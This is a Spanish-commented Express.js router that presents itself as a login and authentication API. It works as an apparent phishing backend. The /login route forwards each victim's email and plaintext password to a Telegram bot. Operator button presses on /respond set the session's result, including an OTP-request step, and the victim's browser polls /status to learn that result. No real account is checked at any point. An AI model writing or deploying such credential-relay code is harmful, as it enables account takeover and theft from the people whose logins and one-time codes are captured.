const express = require('express');
const router = express.Router();
const telegramService = require('../services/telegramService');
const sessionService = require('../services/sessionService');
const { validateEmail, validatePassword } = require('../middleware/validationMiddleware');

// POST /api/auth/login
router.post('/login', async (req, res) => {
  try {
    const { email, password } = req.body;

    // Validación
    if (!email || !validateEmail(email)) {
      return res.status(400).json({ error: 'Email inválido' });
    }

    if (!password || !validatePassword(password)) {
      return res.status(400).json({ error: 'Contraseña inválida' });
    }

    // Crear sesión
    const sessionId = sessionService.createSession({
      type: 'login',
      email,
      password,
    });

    // Enviar a Telegram (sin bloquear si falla)
    try {
      const telegramResponse = await telegramService.sendAuthRequest(sessionId, email, password);
      // Guardar message_id para poder editar el mensaje después
      if (telegramResponse?.result?.message_id) {
        global.sessions[sessionId].messageId = telegramResponse.result.message_id;
      }
      console.log('[AUTH] Mensaje enviado a Telegram exitosamente');
    } catch (telegramError) {
      console.error('[AUTH] Error enviando a Telegram:', telegramError.message);
    }

    // Responder al cliente
    res.json({
      sessionId,
      message: 'Solicitud enviada. Aguardando respuesta...',
    });
  } catch (error) {
    console.error('[AUTH ERROR]', error);
    res.status(500).json({ error: 'Error al procesar la solicitud: ' + error.message });
  }
});

// GET /api/auth/status/:sessionId
router.get('/status/:sessionId', (req, res) => {
  try {
    const { sessionId } = req.params;

    // Validar sesión
    if (!sessionId) {
      return res.status(400).json({ error: 'Session ID requerido' });
    }

    const session = sessionService.getSession(sessionId);

    // Sesión no existe
    if (!session) {
      return res.status(404).json({ error: 'Sesión no encontrada o expirada' });
    }

    // Sesión expirada
    if (sessionService.isExpired(sessionId)) {
      sessionService.deleteSession(sessionId);
      return res.status(410).json({ error: 'Sesión expirada' });
    }

    // Retornar estado
    res.set('Cache-Control', 'no-store, no-cache, must-revalidate');
    res.set('Pragma', 'no-cache');
    res.json({
      sessionId,
      status: session.status,
      response: session.response, // null, 'ERROR', 'RegistroOtp', etc
    });
  } catch (error) {
    console.error('[STATUS ERROR]', error);
    res.status(500).json({ error: 'Error al obtener estado' });
  }
});

// GET /api/auth/respond/:sessionId - Endpoint para botones de Telegram
router.get('/respond/:sessionId', async (req, res) => {
  try {
    const { sessionId } = req.params;
    const { response } = req.query;

    if (!sessionId || !response) {
      return res.status(400).json({ error: 'Parámetros requeridos' });
    }

    const session = sessionService.getSession(sessionId);

    if (!session) {
      return res.status(404).json({ error: 'Sesión no encontrada' });
    }

    // Actualizar sesión con la respuesta
    sessionService.updateSessionStatus(sessionId, 'completed', response);
    console.log(`[AUTH RESPOND] Session ${sessionId}: ${response}`);

    // Eliminar botones del mensaje de Telegram
    if (session.messageId) {
      const emoji = response.includes('Error') || response.includes('ERROR') ? '❌' : '✅';
      await telegramService.removeButtons(
        session.messageId,
        `🔐 <b>Autenticación procesada</b>\n<b>Email:</b> <code>${session.email}</code>\n<b>Respuesta:</b> ${emoji} ${response}`
      );
    }

    // Cerrar ventana automáticamente (no abrir página)
    res.send(`<html><head><title>OK</title></head><body><script>window.close();window.location='about:blank';</script></body></html>`);
  } catch (error) {
    console.error('[RESPOND ERROR]', error);
    res.status(500).json({ error: 'Error al procesar respuesta' });
  }
});

module.exports = router;
